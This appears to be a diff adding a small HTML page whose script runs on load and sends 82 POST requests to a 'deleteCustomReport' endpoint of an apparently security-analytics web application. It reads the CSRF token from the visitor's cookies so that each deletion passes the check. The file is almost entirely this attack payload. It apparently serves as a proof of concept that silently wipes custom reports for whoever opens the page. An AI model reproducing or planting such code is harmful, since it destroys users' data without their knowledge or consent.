@@ -1,0 +1,25 @@
+<html>
+
+<head>
+    <title>CusRepp</title>
+    <script type="text/javascript">
+
+        //    let params = "ueba_csrf=" + uebacsrf + "&uebacsrf=" + uebacsrf;
+        for (let i = 1; i <= 82; i++) {
+            let SaveCustomReportRequest = new XMLHttpRequest();
+            SaveCustomReportRequest.open("POST", "../../CustomReportSettings.do?methodToCall=deleteCustomReport", true);
+            SaveCustomReportRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            // let params = "req=" + params + "&";
+            let uebacsrf = document.cookie.split('uebacsrf=')[1];
+            let params = 'req={"customReportId":"' + i + '"}';
+            params = params + "&ueba_csrf=" + uebacsrf + "&uebacsrf=" + uebacsrf;
+            SaveCustomReportRequest.send(params);
+        }
+    </script>
+</head>
+
+<body>
+    <h1>hai</h1>
+</body>
+
+</html>
